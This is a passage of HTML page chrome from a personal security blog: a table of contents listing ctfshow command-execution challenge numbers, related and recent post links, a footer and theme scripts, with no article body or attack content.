class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-11</div><div class="title">ctfshow xss</div></div></a></div><div><a href="/2022/04/22/ctfshow%20WEBXXE/" title="ctfshow XXE"><img class="cover" src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-22</div><div class="title">ctfshow XXE</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/578879781.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BkingXD</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/BkingXD"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web29"><span class="toc-number">1.1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">1.2.</span> <span class="toc-text">web30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">1.3.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">1.4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web33"><span class="toc-number">1.5.</span> <span class="toc-text">web33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web34"><span class="toc-number">1.6.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web35"><span class="toc-number">1.7.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web36"><span class="toc-number">1.8.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web37"><span class="toc-number">1.9.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web38"><span class="toc-number">1.10.</span> <span class="toc-text">web38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web39"><span class="toc-number">1.11.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web40"><span class="toc-number">1.12.</span> <span class="toc-text">web40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web41"><span class="toc-number">1.13.</span> <span class="toc-text">web41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web42"><span class="toc-number">1.14.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web43"><span class="toc-number">1.15.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web44"><span class="toc-number">1.16.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web45"><span class="toc-number">1.17.</span> <span class="toc-text">web45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web46"><span class="toc-number">1.18.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web47"><span class="toc-number">1.19.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web48"><span class="toc-number">1.20.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web49"><span class="toc-number">1.21.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web50"><span class="toc-number">1.22.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web51"><span class="toc-number">1.23.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web52"><span class="toc-number">1.24.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web53"><span class="toc-number">1.25.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web54"><span class="toc-number">1.26.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web55"><span class="toc-number">1.27.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web56"><span class="toc-number">1.28.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web57"><span class="toc-number">1.29.</span> <span class="toc-text">web57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-57%E6%80%BB%E7%BB%93"><span class="toc-number">1.30.</span> <span class="toc-text">29-57总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web58"><span class="toc-number">1.31.</span> <span class="toc-text">web58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web59"><span class="toc-number">1.32.</span> <span class="toc-text">web59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web60"><span class="toc-number">1.33.</span> <span class="toc-text">web60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web61"><span class="toc-number">1.34.</span> <span class="toc-text">web61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web62"><span class="toc-number">1.35.</span> <span class="toc-text">web62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web63"><span class="toc-number">1.36.</span> <span class="toc-text">web63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web64"><span class="toc-number">1.37.</span> <span class="toc-text">web64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web65"><span class="toc-number">1.38.</span> <span class="toc-text">web65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web66"><span class="toc-number">1.39.</span> <span class="toc-text">web66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web67"><span class="toc-number">1.40.</span> <span class="toc-text">web67</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web68"><span class="toc-number">1.41.</span> <span class="toc-text">web68</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web69"><span class="toc-number">1.42.</span> <span class="toc-text">web69</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web70"><span class="toc-number">1.43.</span> <span class="toc-text">web70</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web71"><span class="toc-number">1.44.</span> <span class="toc-text">web71</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web72"><span class="toc-number">1.45.</span> <span class="toc-text">web72</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web73"><span class="toc-number">1.46.</span> <span class="toc-text">web73</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web74"><span class="toc-number">1.47.</span> <span class="toc-text">web74</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web75"><span class="toc-number">1.48.</span> <span class="toc-text">web75</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web76"><span class="toc-number">1.49.</span> <span class="toc-text">web76</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web77"><span class="toc-number">1.50.</span> <span class="toc-text">web77</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#58-77%E6%80%BB%E7%BB%93"><span class="toc-number">1.51.</span> <span class="toc-text">58-77总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118"><span class="toc-number">1.52.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119"><span class="toc-number">1.53.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120"><span class="toc-number">1.54.</span> <span class="toc-text">web120</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web121"><span class="toc-number">1.55.</span> <span class="toc-text">web121</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web122"><span class="toc-number">1.56.</span> <span class="toc-text">web122</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web124"><span class="toc-number">1.57.</span> <span class="toc-text">web124</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#118-124%E6%80%BB%E7%BB%93"><span class="toc-number">1.58.</span> <span class="toc-text">118-124总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">知识点总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/16/HTB-Starting%20Point-TIER1/" title="HTB-Starting Point-TIER1"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Starting Point-TIER1"/></a><div class="content"><a class="title" href="/2023/05/16/HTB-Starting%20Point-TIER1/" title="HTB-Starting Point-TIER1">HTB-Starting Point-TIER1</a><time datetime="2023-05-16T09:34:45.000Z" title="Created 2023-05-16 17:34:45">2023-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/03/HTB-Starting%20Point-TIER0/" title="HTB-Starting Point-TIER0"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Starting Point-TIER0"/></a><div class="content"><a class="title" href="/2023/05/03/HTB-Starting%20Point-TIER0/" title="HTB-Starting Point-TIER0">HTB-Starting Point-TIER0</a><time datetime="2023-05-03T12:16:45.000Z" title="Created 2023-05-03 20:16:45">2023-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/05/ctfshow%20%E6%84%9A%E4%BA%BA%E6%9D%AF(2023)/" title="ctfshow 2023愚人杯"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow 2023愚人杯"/></a><div class="content"><a class="title" href="/2023/04/05/ctfshow%20%E6%84%9A%E4%BA%BA%E6%9D%AF(2023)/" title="ctfshow 2023愚人杯">ctfshow 2023愚人杯</a><time datetime="2023-04-05T12:16:45.000Z" title="Created 2023-04-05 20:16:45">2023-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94CommonCollections6/" title="Java反序列化——CommonCollections6"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java反序列化——CommonCollections6"/></a><div class="content"><a class="title" href="/2023/03/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94CommonCollections6/" title="Java反序列化——CommonCollections6">Java反序列化——CommonCollections6</a><time datetime="2023-03-10T08:32:23.000Z" title="Created 2023-03-10 16:32:23">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/02/HTB-Support/" title="HTB-Support"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Support"/></a><div class="content"><a class="title" href="/2022/12/02/HTB-Support/" title="HTB-Support">HTB-Support</a><time datetime="2022-12-02T12:16:45.000Z" title="Created 2022-12-02 20:16:45">2022-12-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By BkingXD</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>